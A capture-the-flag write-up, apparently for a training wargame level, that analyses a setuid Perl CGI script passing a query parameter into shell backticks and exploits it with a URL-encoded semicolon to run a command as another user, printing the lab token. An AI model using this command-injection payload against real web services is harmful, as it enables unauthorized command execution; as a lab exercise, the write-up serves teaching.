# level04

Target is `flag04`. Scouting:

```sh
ls -lA
```

We get:

```
-rwsr-sr-x 1 flag04  level04  152 Mar  5  2016 level04.pl
```

Looks like Perl script.

```sh
file level04.pl
```

Gives:

```
level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
```

Yep. Here is its content:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

In Perl, backticks (`` ` ``) are similar to that of POSIX shell. It basically returns the output of the command inside the quotes.

The script is a bit confusing. Let's refactor it.

```perl
#!/usr/bin/perl

use CGI qw{param};

sub serve {
  $value = $_[0];
  print `echo $value 2>&1`;
}

print "Content-type: text/html\n\n";
serve(param("x"));
```

That's better. The original script had a hostname-port pair. We can try to connect using an HTTP client.

```sh
curl -v http://localhost:4747
```

Output:

```
* About to connect() to localhost port 4747 (#0)
*   Trying 127.0.0.1... connected
> GET / HTTP/1.1
> User-Agent: curl/7.22.0 (i686-pc-linux-gnu) libcurl/7.22.0 OpenSSL/1.0.1 zlib/1.2.3.4 libidn/1.23 librtmp/2.3
> Host: localhost:4747
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Mon, 16 Jun 2025 06:33:12 GMT
< Server: Apache/2.2.22 (Ubuntu)
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< Content-Type: text/html
<

* Connection #0 to host localhost left intact
* Closing connection #0
```

We are getting a response. If we look at the script, it is supposed to print the result of `echo $x`, `$x` being the query parameter `x`. Let's try something simple:

```sh
curl http://localhost:4747?x=bbrassar
```

Output:

```
bbrassar
```

Nice. This was not explicitly mentioned earlier, but `level04.pl` has setuid and setgid bits, and belong to user `flag04`. This means that the script is always executed as user `flag04`. Much like the previous level, we simply need to exploit the script to execute `getflag`.

We could try something like this:

```sh
curl http://localhost:4747?x=;getflag # not working!
```

That cannot work, because our shell (bash) interprets the semicolon `;` as a command break. We could try to escape it with a backslash `\`, but then the HTTP server (maybe client?) would interpret it in a special way because of how URLs work. The correct way to go here is the URL-encode the semicolon:

```sh
curl http://localhost:4747?x=%3Bgetflag # 0x3B = ASCII ';'
```

Output:

```

Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

Just to verify:

```
level05@localhost's password: ne2searoevaevoem4ov4ar8ap
You have new mail.
```

Awesome.
